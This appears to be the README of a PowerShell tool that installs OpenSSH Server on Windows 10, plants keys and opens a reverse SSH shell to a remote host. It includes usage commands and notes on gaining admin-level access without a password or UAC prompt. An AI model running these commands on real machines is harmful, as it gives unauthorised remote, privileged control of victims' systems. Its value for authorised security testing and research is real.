# lol-reverseSSHell
Living Off the LAN Reverse Shell over SSH

This script is intended to make working with SSH reverse shells easier on Windows 10. It will install OpenSSH Server (if missing) on Windows 10 via WindowsCapability. Then it will copy the sshd_config file, SSH private key, and authorized_keys file to the proper locations on the Windows host. Finally it creates a reverse SSH connection. The shell served is CMD.exe by default. Once you're in the cmd.exe cli, you can type 'powershell' to get a PS shell. 

* Please generate NEW SSH KEYs. Use the repo keys only for testing. 

Usage: 
* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost 10.10.10.10
* .\lol-reverseSSHell.ps1 -DestinationUserName `<user>` -DestinationHost 10.10.10.10 -DestinationPort 22 -DestinationBindLocalPort 7777 -InstallOpenSSHServer yes 
* get-help .\lol-reverseSSHell.ps1 

* get-help .\lol-reverseSSHell.ps1 -Examples

Remote cmd.exe in a bash terminal via ssh: 
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image.png?raw=true)
Remotely executing commands via cmd.exe and powershell:  
![alt text](https://github.com/ArronJablonowski/lol-reverseSSHell/blob/main/image02.png?raw=true)

Unix vs Windows Reverse SSH Shells, and the Interesting Security Implications for Windows Users
-----------------------------------------------------------------------------------------------
Running list as I do research: 
* Unknown usernames are OK - Once you have a reverse connection, Windows does NOT require knowing the username to authenticate to a shell when using keypair authentication. A simple call to localhost will connect to a shell under the context of the user that initiated it. 
 
  --- Windows Example --- ssh localhost -p `<localport>`  
  --- Unix Example --------- ssh user123@localhost -p `<localport>` 
* Admin privleges - Because the shell is ran using an admin PS promt, your shell will have admin privleges without ever knowing the user's admin password. No sudo commands or UAC to prevent elevated privleges. Which means you can modify system files without issue.  

